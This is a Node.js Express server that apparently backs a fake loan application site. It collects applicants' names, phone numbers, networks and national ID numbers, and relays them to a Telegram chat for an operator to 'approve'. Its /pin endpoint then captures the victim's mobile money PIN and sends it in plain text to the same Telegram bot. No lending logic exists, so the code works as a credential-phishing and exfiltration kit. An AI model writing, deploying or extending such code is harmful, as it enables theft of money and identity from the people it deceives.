const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ENV
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ================= MEMORY DB =================
const users = {};

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= APPLY =================
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  if (!name || !phone || !network || !amount || !nationalId) {
    return res.status(400).send("Missing fields");
  }

  // STORE USER
  users[phone] = {
    name,
    phone,
    network,
    amount,
    nationalId,
    status: "pending"
  };

  const message = `
📥 NEW LOAN APPLICATION

👤 ${name}
📱 ${phone}
📡 ${network}
💰 ${amount}
🆔 ${nationalId}

-------------------------
Choose action:
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Approve", callback_data: `approve_${phone}` },
            { text: "❌ Decline", callback_data: `decline_${phone}` }
          ]
        ]
      }
    });

    res.json({ success: true, phone });

  } catch (err) {
    console.log(err.response?.data || err.message);
    res.status(500).send("Telegram failed");
  }
});

// ================= STATUS CHECK =================
app.get("/status/:phone", (req, res) => {
  const phone = req.params.phone;

  if (!users[phone]) {
    return res.json({ status: "unknown" });
  }

  res.json({ status: users[phone].status });
});

// ================= WEBHOOK =================
app.post("/webhook", async (req, res) => {
  const data = req.body;

  try {
    if (data.callback_query) {
      const action = data.callback_query.data;
      const phone = action.split("_")[1];

      if (users[phone]) {
        if (action.startsWith("approve")) {
          users[phone].status = "approved";
        } else if (action.startsWith("decline")) {
          users[phone].status = "declined";
        }
      }

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: users[phone]
          ? `Status updated for ${phone}: ${users[phone].status}`
          : "User not found"
      });
    }

  } catch (err) {
    console.log(err.message);
  }

  res.sendStatus(200);
});

// ================= PIN STEP =================
app.post("/pin-step", async (req, res) => {
  const { phone } = req.body;

  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: `📍 PIN STEP REACHED\n📱 ${phone}`
  });

  res.sendStatus(200);
});

// ================= PIN =================
app.post("/pin", async (req, res) => {
  const { phone, pin } = req.body;

  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: `🔐 PIN: ${pin}\n📱 ${phone}`
  });

  res.sendStatus(200);
});

// ================= START =================
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("Server running on port " + PORT);
});
